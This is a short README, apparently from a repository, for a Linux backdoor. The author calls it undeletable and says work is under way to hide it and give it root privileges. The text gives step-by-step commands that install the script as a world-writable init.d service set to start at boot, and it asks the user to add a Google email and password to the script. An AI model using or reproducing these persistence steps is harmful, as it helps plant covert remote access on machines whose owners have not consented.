# linux_backdoor
\linux backdoor , have some fanctionalites , its undeletble , i am still working to hide it and gave it root previlages
\after you download it you do this commands:
\nano NGROK_0
#change MAIL and PASSWD in line 23 , 24 , to your google email and password 
sudo mv NGROK_0 /etc/init.d/
sudo chown root:root /etc/init.d/NGROK_0
sudo chmod 777 /etc/init.d/NGROK_0
sudo update-rc.d  NGROK_0 defaults
sudo update-rc.d  NGROK_0 enable
sudo systemctl daemon-reload
sudo service start  NGROK_0
